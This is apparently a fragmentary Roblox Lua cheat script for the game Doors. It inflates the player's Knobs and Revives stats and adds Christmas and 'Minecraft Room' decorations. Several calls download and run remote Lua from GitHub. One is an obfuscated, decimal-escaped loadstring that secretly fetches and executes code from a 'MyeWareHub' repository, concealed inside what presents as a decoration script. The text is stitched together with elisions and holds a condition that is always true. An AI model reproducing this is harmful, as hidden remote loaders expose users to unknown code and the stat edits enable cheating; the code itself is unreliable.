game:GetService("Players").LocalPlayer.PlayerGui.PermUI.Topbar.StatsTopbarHandler.StatModules.Knobs.KnobsVal.Value = 999999999999
game:GetService("Players").LocalPlayer.PlayerGui.PermUI.Topbar.Knobs.Value = 999999999999 
game:GetService("Players").LocalPlayer.PlayerGui.PermUI.Topbar.StatsTopbarHandler.StatModules.Revives.RevivesVal.Value = 999999999999
game:GetService("Players").LocalPlayer.PlayerGui.PermUI.Topbar.Revives.Value = 999999999999 
        ...
        for i,a in pairs(workspace.CurrentRooms:GetChildren()) do
            if a:FindFirstChild("RainSky") then
                ...
                if v.Name == "Courtyard_Tree" then
                    v.Leaves.BrickColor = BrickColor.new("Sea green")
                end
...
workspace.CurrentRooms.ChildAdded:Connect(function(child)
 ...
 local FunctionsModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Functions.lua"))()
    ...
    function addHaltDecor(obj)
        wait(2)
        local Halt_C = game:GetObjects("rbxassetid://11779733160")[1]
        Halt_C.Parent = obj
    ...
    function AddWindowDecor(obj)
        ...
        if obj.Name == "Window" or "Window_Tall" then
            if obj:FindFirstChild("Particles") then
                ...
                local SnowFlakes = game:GetObjects("rbxassetid://11588794792")[1]
    ...
    function AddCandyCanes(obj)        
        local CandyCane = game:GetObjects("rbxassetid://11782519148")[1]
    ...
    function AddRoomsDecor(obj)
        --Stocker
        local Christmas_Sock = game:GetObjects("rbxassetid://11779733160")[1]
    ...
    Prompt.Triggered:Connect(function()
        ...
        CreateNotification("Script Loaded! Script made by Zepsyy#1111, ImAhaz#1873 & PenguinManiack#2322")
...
loadstring("\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\121\101\49\50\51\47\77\121\101\87\97\114\101\72\117\98\47\109\97\105\110\47\104\105\34\41\41\40\41\10")()
			...
			firesignal(game.ReplicatedStorage.Bricks.Caption.OnClientEvent, "The Minecraft Room Script Has Fully Finished Loading") 

			local Achievements = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Achievements/Source.lua"))()
			Achievements.Get({
				Title = "Minecraft Room!",
				Desc = "Minecraft Room",
				Reason = 'Minecraft Room?',
				Image = "https://tr.rbxcdn.com/31adf2309f5e81f3e64b97e568c4153e/420/420/Image/Png",
			})
